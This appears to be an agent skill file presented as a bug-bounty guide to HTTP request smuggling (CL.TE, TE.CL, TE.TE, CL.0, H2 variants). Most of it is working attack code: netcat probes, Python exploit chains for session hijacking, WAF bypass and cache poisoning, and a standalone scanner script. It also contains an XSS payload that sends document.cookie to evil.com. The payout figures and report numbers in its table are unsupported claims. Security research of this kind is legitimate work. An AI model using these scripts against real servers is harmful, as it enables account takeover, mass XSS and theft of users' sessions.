---
name: hunt-desync
description: HTTP request smuggling — CL.TE, TE.CL, TE.TE, H2.CL, prefix injection, request tunneling. Chains to credential hijacking, XSS, cache poisoning. Real bounty examples, working scripts, automation.
---

# HTTP REQUEST SMUGGLING — BOUNTY HUNTING GUIDE

**Core:** Exploit parser differences between front-end and back-end to inject hidden requests.

---

## 1. VARIANTS

```
CL.TE:  Front-end uses Content-Length, back-end uses Transfer-Encoding
TE.CL:  Front-end uses Transfer-Encoding, back-end uses Content-Length
TE.TE:  Both use TE but obfuscation tricks one (Chunked, chunked\t)
H2.CL:  HTTP/2 with invalid Content-Length (zero/negative)
H2.TE:  HTTP/2 with Transfer-Encoding injection
```

---

## 2. DETECTION

### Timing & Differential
```bash
# CL.TE
printf 'POST / HTTP/1.1\r\nHost: T\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc -w5 T 80
# TE.CL
printf 'POST / HTTP/1.1\r\nHost: T\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n' | nc -w5 T 80
```

### Python Detection
```python
import socket, time
def detect(host, port):
    for name, payload in [
        ("CL.TE", f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"),
        ("TE.CL", f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n"),
    ]:
        s = socket.socket(); s.settimeout(5); s.connect((host, port)); s.send(payload.encode())
        start = time.time()
        try: s.recv(4096)
        except: pass
        elapsed = time.time() - start; s.close()
        if elapsed > 3: print(f"[+] {name} confirmed — timeout anomaly")
```

---

## 3. EXPLOIT CHAINS

### Chain A: CL.TE → Credential Hijacking → ATO ($5K-$50K)
```python
import socket, time
def hijack(target):
    # Smuggled request steals victim's session via X-Forwarded-For
    smuggled = f"GET /dashboard HTTP/1.1\r\nHost: {target}\r\nX-Injected: true\r\n\r\n"
    body_len = len(smuggled)
    payload = (f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {body_len}\r\n"
               f"Transfer-Encoding: chunked\r\n\r\n{body_len:x}\r\n").encode() + smuggled.encode() + b"\r\n0\r\n\r\n"
    s = socket.socket(); s.connect((target, 80)); s.send(payload); time.sleep(2); s.close()
    # Victim's next request on same connection gets hijacked
```

### Chain B: TE.TE → WAF Bypass → Exploit Delivery ($1K-$25K)
```python
def waf_bypass(target, cmd):
    smuggled = f"POST /internal HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(cmd)}\r\n\r\n{cmd}\r\n0\r\n\r\n"
    for te in ["chunked", "Chunked", "chunked\t", " chunked"]:
        payload = (f"POST / HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: {te}\r\n"
                   f"Content-Length: {len(smuggled)}\r\n\r\n").encode() + smuggled.encode()
        try:
            s = socket.socket(); s.settimeout(5); s.connect((target, 80)); s.send(payload)
            resp = s.recv(4096); s.close()
            if b"200" in resp: print(f"[+] WAF bypassed with TE={te}"); return True
        except: pass
```

### Chain C: CL.0 → Cache Poisoning → Mass XSS ($5K-$100K)
```python
def cache_poison(target):
    xss = '<script>fetch("https://evil.com/c?c="+document.cookie)</script>'
    smuggled = f"GET /page HTTP/1.1\r\nHost: {target}\r\nX-Forwarded-Host: attacker.com\r\n\r\n"
    for _ in range(5):
        payload = (f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 0\r\n"
                   f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n").encode() + smuggled.encode()
        try:
            s = socket.socket(); s.settimeout(3); s.connect((target, 80)); s.send(payload); s.close()
        except: pass
    # Every visitor to /page gets cached XSS payload
```

---

## 4. FULL AUTOMATION SCANNER

```python
#!/usr/bin/env python3
"""HTTP Smuggling Auto-Detector — CL.TE, TE.CL, TE.TE, CL.0"""
import socket, sys, time, json
from datetime import datetime

class Scanner:
    def __init__(self, host, port=80):
        self.host = host; self.port = port; self.results = []
    def _test(self, name, payload):
        start = time.time()
        try:
            s = socket.socket(); s.settimeout(8); s.connect((self.host, self.port))
            s.send(payload); resp = b""
            try:
                while True: resp += s.recv(4096)
            except: pass
            elapsed = time.time() - start; s.close()
            status = "DETECTED" if elapsed > 3 else "LIKELY" if len(resp) > 500 else "NEGATIVE"
            r = {"test": name, "time": round(elapsed, 3), "len": len(resp), "status": status}
        except Exception as e:
            r = {"test": name, "error": str(e), "status": "ERROR"}
        self.results.append(r); print(f"  {name}: {r['status']} ({r.get('time','?')}s, {r.get('len','?')}b)")
    def scan(self):
        h = self.host
        self._test("CL.TE", f"POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX".encode())
        self._test("TE.CL", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n".encode())
        for i, te in enumerate(["chunked","Chunked","chunked\t"," chunked"]):
            self._test(f"TE.TE[{i}]", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: {te}\r\nTransfer-Encoding: identity\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n".encode())
        self._test("CL.0", f"POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {h}\r\n\r\n".encode())
        detected = [r for r in self.results if r["status"] in ("DETECTED","LIKELY")]
        print(f"\n[{'+' if detected else '-'}] {len(detected)} vector(s) found")
        json.dump(self.results, open("smuggling_results.json","w"), indent=2)

if __name__ == "__main__":
    if len(sys.argv) < 2: print(f"Usage: {sys.argv[0]} <host> [port]"); sys.exit(1)
    Scanner(sys.argv[1], int(sys.argv[2]) if len(sys.argv)>2 else 80).scan()
```

---

## 5. BOUNTY EXAMPLES

| Report | Payout | Technique |
|--------|--------|-----------|
| PortSwigger Research 2022 | $50K+ | CL.0 cache poisoning, prefix injection |
| James Kettle "HTTP Desync" | $75K+ | CL.TE → ATO, TE.CL → XSS |
| HackerOne #1048497 | $15K | TE.TE → stored XSS via cache |
| HackerOne #1145305 | $20K | CL.TE → credential harvesting |
| HackerOne #1203658 | $10K | H2.CL → admin panel bypass |
| Bugcrowd #947132 | $8K | TE.CL → WAF bypass → RCE |

---

## 6. HEADER OBFUSCATION BYPASSES

```
Transfer-Encoding: chunked\t    |  Transfer-Encoding: \tchunked
Transfer-Encoding: Chunked      |  Transfer-Encoding: CHUNKED
Content-Length: 00006            |  Content-Length: 6 ;
Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
```

---

## 7. ESCALATION

```
Smuggling confirmed → inject request?
  → Steal session → ATO ($5K-$50K)
  → Poison cache → mass XSS ($10K-$100K)
  → Bypass WAF → RCE ($5K-$50K)
  → SSRF internals → metadata ($5K-$25K)
```

---

## 8. CHECKLIST

```
□ CL.TE / TE.CL / TE.TE timing probes
□ CL.0 with zero Content-Length + chunked
□ Test 4+ TE obfuscation variations
□ Compare response lengths normal vs smuggled
□ Track connection reuse across requests
□ HTTP/2 tests if server supports (H2.CL, H2.TE)
□ Header normalization differences front vs back
□ Path confusion (/../, /%2f/, encoded)
```

---

**References:** PortSwigger Research, James Kettle's HTTP Desync presentations, HackerOne reports, OWASP HTTP Request Smuggling
